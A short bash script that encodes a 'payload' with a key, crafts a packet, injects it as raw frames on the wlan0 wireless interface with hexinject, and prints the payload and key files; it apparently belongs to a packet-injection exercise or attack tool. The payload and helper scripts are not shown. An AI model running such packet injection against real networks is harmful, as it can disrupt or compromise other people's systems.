#!/bin/bash

#encode payload with key to payload
python encode.py > payload
echo "encoded"

#make packet
python craft.py
echo "crafted"

#send
cat werk.pcap | hex2raw -r | hexinject -p -i wlan0
echo "sent"

echo "**payload"
cat payload
echo "**payloadI"
cat payloadI
echo "**key"
cat key
